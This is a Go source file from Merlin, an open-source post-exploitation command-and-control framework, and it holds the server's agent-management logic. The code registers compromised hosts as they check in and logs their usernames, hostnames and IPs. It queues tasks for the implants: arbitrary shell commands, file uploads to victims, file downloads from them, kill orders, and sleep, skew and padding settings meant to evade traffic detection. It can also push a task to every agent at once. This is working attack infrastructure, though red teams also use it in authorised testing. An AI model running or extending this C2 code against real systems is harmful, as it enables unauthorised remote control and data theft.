// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2018  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package agents

import (
	// Standard
	"os"
	"time"
	"fmt"
	"path/filepath"
	"path"
	"encoding/json"
	"io/ioutil"
	"crypto/sha1"
	"io"
	"encoding/base64"
	"strings"
	"errors"
	"strconv"

	// 3rd Party
	"github.com/satori/go.uuid"
	"github.com/fatih/color"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/messages"
	"github.com/Ne0nd0g/merlin/pkg/core"
	"github.com/Ne0nd0g/merlin/pkg/logging"
	"github.com/olekukonko/tablewriter"
)

// Global Variables

// Agents contains all of the instantiated agent object that are accessed by other modules
var Agents = make(map[uuid.UUID]*agent)
var paddingMax = 4096

type agent struct {
	ID            uuid.UUID
	Platform      string
	Architecture  string
	UserName      string
	UserGUID      string
	HostName      string
	Ips           []string
	Pid           int
	agentLog      *os.File
	channel       chan []string
	iCheckIn      time.Time
	sCheckIn      time.Time
	Version       string
	Build         string
	WaitTime      string
	PaddingMax    int
	MaxRetry      int
	FailedCheckin int
	Skew		  int64
}

// InitialCheckIn is run on the first communication with an agent and is used to instantiate an agent object
func InitialCheckIn(j messages.Base, p messages.SysInfo) {
	message("success", fmt.Sprintf("Received new agent checkin from %s", j.ID))
	//serverLog.WriteString(fmt.Sprintf("[%s]Received new agent checkin from %s\r\n", time.Now(), j.ID))
	if core.Verbose {
		message("info", fmt.Sprintf("Host ID: %s", j.ID))
		message("info", fmt.Sprintf("Host ID: %s", j.ID))
		message("info", fmt.Sprintf("Activity: %s", j.Type))
		message("info", fmt.Sprintf("Payload: %s", j.Payload))
		message("info", fmt.Sprintf("Platform: %s", p.Platform))
		message("info", fmt.Sprintf("Architecture: %s", p.Architecture))
		message("info", fmt.Sprintf("Username: %s", p.UserName))
		message("info", fmt.Sprintf("IpAddrs: %v", p.Ips))
	}
	// TODO move currentDir to a core library
	agentsDir := filepath.Join(core.CurrentDir, "data", "agents")

	if _, errD := os.Stat(agentsDir); os.IsNotExist(errD) {
		os.Mkdir(agentsDir, os.ModeDir)
	}
	if _, err := os.Stat(filepath.Join(agentsDir, j.ID.String())); os.IsNotExist(err) {
		os.Mkdir(filepath.Join(agentsDir, j.ID.String()), os.ModeDir)
		os.Create(filepath.Join(agentsDir, j.ID.String(), "agent_log.txt"))

		if core.Verbose {
			message("note",fmt.Sprintf("Created agent log file at: %s agent_log.txt",
				path.Join(agentsDir, j.ID.String())))
		}
	}

	f, err := os.OpenFile(filepath.Join(agentsDir, j.ID.String(), "agent_log.txt"), os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		panic(err)
	}
	// Add custom agent struct to global agents map
	Agents[j.ID] = &agent{ID: j.ID, UserName: p.UserName, UserGUID: p.UserGUID, Platform: p.Platform,
		Architecture: p.Architecture, Ips: p.Ips,
		HostName: p.HostName, Pid: p.Pid, channel: make(chan []string, 10),
		agentLog: f, iCheckIn: time.Now(), sCheckIn: time.Now()}

	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Initial check in for agent %s\r\n", time.Now(), j.ID))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Platform: %s\r\n", time.Now(), p.Platform))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Architecture: %s\r\n", time.Now(), p.Architecture))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]HostName: %s\r\n", time.Now(), p.HostName))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]UserName: %s\r\n", time.Now(), p.UserName))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]UserGUID: %s\r\n", time.Now(), p.UserGUID))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Process ID: %d\r\n", time.Now(), p.Pid))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]IPs: %v\r\n", time.Now(), p.Ips))

	// Add code here to create db record
}

// StatusCheckIn is the function that is run when an agent sends a message back to server, checking in for additional instructions
func StatusCheckIn(j messages.Base) messages.Base {
	// Check to make sure agent UUID is in dataset
	_, ok := Agents[j.ID]
	if !ok {
		message("warn", fmt.Sprintf("Orphaned agent %s has checked in. Instructing agent to re-initialize...", j.ID.String()))
		logging.Server(fmt.Sprintf("[Orphaned agent %s has checked in", j.ID.String()))
		jobID := core.RandStringBytesMaskImprSrc(10)
		message("note", fmt.Sprintf("Created job %s for agent %s", jobID, j.ID))
		g := messages.Base{
			Version: 1.0,
			ID:      j.ID,
			Type:    "AgentControl",
			Padding: core.RandStringBytesMaskImprSrc(paddingMax),
		}
		p := messages.AgentControl{
			Command: "initialize",
			Job:     jobID,
		}

		k := marshalMessage(p)
		g.Payload = (*json.RawMessage)(&k)
		return g
	}

	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Agent status check in\r\n", time.Now()))
	if core.Verbose {
		message("success", fmt.Sprintf("Received agent status checkin from %s", j.ID))
	}
	if core.Debug {
		message("debug", fmt.Sprintf("Received agent status checkin from %s", j.ID))
		message("debug", fmt.Sprintf("Channel length: %d", len(Agents[j.ID].channel)))
		message("debug", fmt.Sprintf("Channel content: %s", Agents[j.ID].channel))
	}

	Agents[j.ID].sCheckIn = time.Now()
	if len(Agents[j.ID].channel) >= 1 {
		command := <-Agents[j.ID].channel
		if core.Debug{message("debug",fmt.Sprintf("Channel command string: %s", command))}
		jobID := core.RandStringBytesMaskImprSrc(10)
		message("note", fmt.Sprintf("Created job %s for agent %s", jobID, j.ID))

		Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Command Type: %s\r\n", time.Now(), command[0]))
		Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Command: %s\r\n", time.Now(), command[1:]))
		Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Created job %s for agent %s\r\n", time.Now(), jobID, j.ID))

		m := messages.Base{
			Version: 1.0,
			ID:      j.ID,
			Padding: core.RandStringBytesMaskImprSrc(paddingMax),
		}

		if core.Debug {
			message("debug", fmt.Sprintf("Agent command type: %s", command[1]))
		}

		switch command[0] {
		case "upload":
			// TODO add error handling
			uploadFile, uploadFileErr := ioutil.ReadFile(command[1])
			if uploadFileErr != nil {
				message("warn", fmt.Sprintf("There was an error reading %s", command[1]))
				message("warn", uploadFileErr.Error())
				m.Type = "ServerOk"
				return m
			}
			fileHash := sha1.New()
			io.WriteString(fileHash, string(uploadFile))
			Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Uploading file from server at %s of size %d" +
				" bytes and SHA-1: %x to agent at %s\r\n",
				time.Now(),
				command[1],
				len(uploadFile),
				fileHash.Sum(nil),
				command[2]))

			p := messages.FileTransfer{
				FileLocation: command[2],
				FileBlob:     base64.StdEncoding.EncodeToString([]byte(uploadFile)),
				IsDownload:   true, // The agent will be downloading the file provided by the server in the FileBlob field
				Job:          jobID,
			}

			k := marshalMessage(p)
			m.Type = "FileTransfer"
			m.Payload = (*json.RawMessage)(&k)

			return m
		case "download":
			Agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Downloading file from agent at %s\n",
				time.Now(),
				command[1]))

			p := messages.FileTransfer{
				FileLocation:	command[1],
				Job:      		jobID,
				IsDownload: false,
			}

			k := marshalMessage(p)
			m.Type = "FileTransfer"
			m.Payload = (*json.RawMessage)(&k)

			return m
		case "cmd":
			p := messages.CmdPayload{
				Command: command[1],
				Job:     jobID,
			}
			if len(command) > 2 {
				p.Args = strings.Join(command[2:], " ")
			}

			k := marshalMessage(p)
			m.Type = "CmdPayload"
			m.Payload = (*json.RawMessage)(&k)

			return m
		case "AgentControl":
			switch command[1] {
			case "skew":
				p := messages.AgentControl{
					Command: command[1],
					Job:     jobID,
				}

				if len(command) == 3 {
					p.Args = command[2]
				}
				k := marshalMessage(p)
				m.Type = "AgentControl"
				m.Payload = (*json.RawMessage)(&k)
				return m
			case "sleep":
				p := messages.AgentControl{
					Command: command[1],
					Job:     jobID,
				}

				if len(command) == 3 {
					p.Args = command[2]
				}
				k := marshalMessage(p)
				m.Type = "AgentControl"
				m.Payload = (*json.RawMessage)(&k)
				return m
			case "padding":
				p := messages.AgentControl{
					Command: command[1],
					Job:     jobID,
				}

				if len(command) == 3 {
					p.Args = command[2]
				}
				k := marshalMessage(p)
				m.Type = "AgentControl"
				m.Payload = (*json.RawMessage)(&k)
				return m
			case "maxretry":
				p := messages.AgentControl{
					Command: command[1],
					Job:     jobID,
				}

				if len(command) == 3 {
					p.Args = command[2]
				}
				k := marshalMessage(p)
				m.Type = "AgentControl"
				m.Payload = (*json.RawMessage)(&k)
				return m
			}
			m.Type = "ServerOk"
			return m
		case "kill":
			p := messages.AgentControl{
				Command: command[1],
				Job:     jobID,
			}

			k := marshalMessage(p)
			m.Type = "AgentControl"
			m.Payload = (*json.RawMessage)(&k)

			delete(Agents, j.ID)

			return m

		default:
			m.Type = "ServerOk"
			return m
		}
	} else {
		g := messages.Base{
			Version: 1.0,
			ID:      j.ID,
			Type:    "ServerOk",
			Padding: core.RandStringBytesMaskImprSrc(paddingMax),
		}
		return g
	}

}

func marshalMessage(m interface{}) []byte {
	k, err := json.Marshal(m)
	if err != nil {
		message("warn", "There was an error marshaling the JSON object")
		message("warn", err.Error())
	}
	return k
}

// Info is used to update an agent's information with the passed in message data
func Info(j messages.Base, p messages.AgentInfo) {
	_, ok := Agents[j.ID]

	if !ok {
		message("warn","The agent was not found while processing an AgentInfo message" )
		return
	}
	if core.Debug {
		message("debug","Processing new agent info")
		message("debug",fmt.Sprintf("Agent Version: %s", p.Version))
		message("debug",fmt.Sprintf("Agent Build: %s", p.Build))
		message("debug",fmt.Sprintf("Agent waitTime: %s", p.WaitTime))
		message("debug",fmt.Sprintf("Agent skew: %d", p.Skew))
		message("debug",fmt.Sprintf("Agent paddingMax: %d", p.PaddingMax))
		message("debug",fmt.Sprintf("Agent maxRetry: %d", p.MaxRetry))
		message("debug",fmt.Sprintf("Agent failedCheckin: %d", p.FailedCheckin))
	}
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("Processing AgentInfo message:\r\n"))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent Version: %s \r\n", p.Version))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent Build: %s \r\n", p.Build))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent waitTime: %s \r\n", p.WaitTime))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent skew: %d \r\n", p.Skew))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent paddingMax: %d \r\n", p.PaddingMax))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent maxRetry: %d \r\n", p.MaxRetry))
	Agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent failedCheckin: %d \r\n", p.FailedCheckin))

	Agents[j.ID].Version = p.Version
	Agents[j.ID].Build = p.Build
	Agents[j.ID].WaitTime = p.WaitTime
	Agents[j.ID].Skew = p.Skew
	Agents[j.ID].PaddingMax = p.PaddingMax
	Agents[j.ID].MaxRetry = p.MaxRetry
	Agents[j.ID].FailedCheckin = p.FailedCheckin
}

// Log is used to write log messages to the agent's log file
func Log (agentID uuid.UUID, logMessage string) {
	Agents[agentID].agentLog.WriteString(fmt.Sprintf("[%s]%s\r\n", time.Now(), logMessage))
}

// GetAgentList returns a list of agents that exist and is used for command line tab completion
func GetAgentList() func(string) []string {
	return func(line string) []string {
		a := make([]string, 0)
		for k := range Agents {
			a = append(a, k.String())
		}
		return a
	}
}

// AddChannel is the function used to add commands for an agent to run into the channel
func AddChannel(agentID uuid.UUID, cmdType string, cmd []string) (error) {
	if core.Debug{
		message("debug", fmt.Sprintf("In agents.AddChannel function for agent: %s", agentID.String()))
		message("debug", fmt.Sprintf("In agents.AddChannel function for type: %s", cmdType))
		message("debug", fmt.Sprintf("In agents.AddChannel function for command: %s", cmd))
	}

	isAgent := false

	for k := range Agents {
		if Agents[k].ID == agentID {
			isAgent = true
		}
	}
	if agentID.String() == "ffffffff-ffff-ffff-ffff-ffffffffffff"{isAgent = true}

	if isAgent {
		if agentID.String() == "ffffffff-ffff-ffff-ffff-ffffffffffff"{
			for k := range Agents {
				s := Agents[k].channel
				c := []string{cmdType}
				c = append(c, cmd...)
				s <- c
			}
			return nil
		}
		s := Agents[agentID].channel
		c := []string{cmdType}
		c = append(c, cmd...)
		s <- c
		return nil
	}
	return errors.New("invalid agent ID")
}

// TODO turn this into a method of the agent struct

// ShowInfo lists all of the agent's structure value in a table
func ShowInfo(agentID uuid.UUID){

	table := tablewriter.NewWriter(os.Stdout)
	table.SetAlignment(tablewriter.ALIGN_LEFT)

	data := [][]string{
		{"ID", Agents[agentID].ID.String()},
		{"Platform", Agents[agentID].Platform},
		{"Architecture", Agents[agentID].Architecture},
		{"UserName", Agents[agentID].UserName},
		{"User GUID", Agents[agentID].UserGUID},
		{"Hostname", Agents[agentID].HostName},
		{"Process ID", strconv.Itoa(Agents[agentID].Pid)},
		{"IP", fmt.Sprintf("%v", Agents[agentID].Ips)},
		{"Initial Check In", Agents[agentID].iCheckIn.String()},
		{"Last Check In", Agents[agentID].sCheckIn.String()},
		{"Agent Version", Agents[agentID].Version},
		{"Agent Build", Agents[agentID].Build},
		{"Agent Wait Time", Agents[agentID].WaitTime},
		{"Agent Wait Time Skew", fmt.Sprintf(strconv.FormatInt(Agents[agentID].Skew, 10))},
		{"Agent Message Padding Max", strconv.Itoa(Agents[agentID].PaddingMax)},
		{"Agent Max Retries", strconv.Itoa(Agents[agentID].MaxRetry)},
		{"Agent Failed Logins", strconv.Itoa(Agents[agentID].FailedCheckin)},
	}
	table.AppendBulk(data)
	fmt.Println()
	table.Render()
	fmt.Println()
}

// message is used to print a message to the command line
func message (level string, message string) {
	switch level {
	case "info":
		color.Cyan("[i]" + message)
	case "note":
		color.Yellow("[-]" + message)
	case "warn":
		color.Red("[!]" + message)
	case "debug":
		color.Red("[DEBUG]" + message)
	case "success":
		color.Green("[+]" + message)
	default:
		color.Red("[_-_]Invalid message level: " + message)
	}
}

// TODO configure all message to be displayed on the CLI to be returned as errors and not written to the CLI here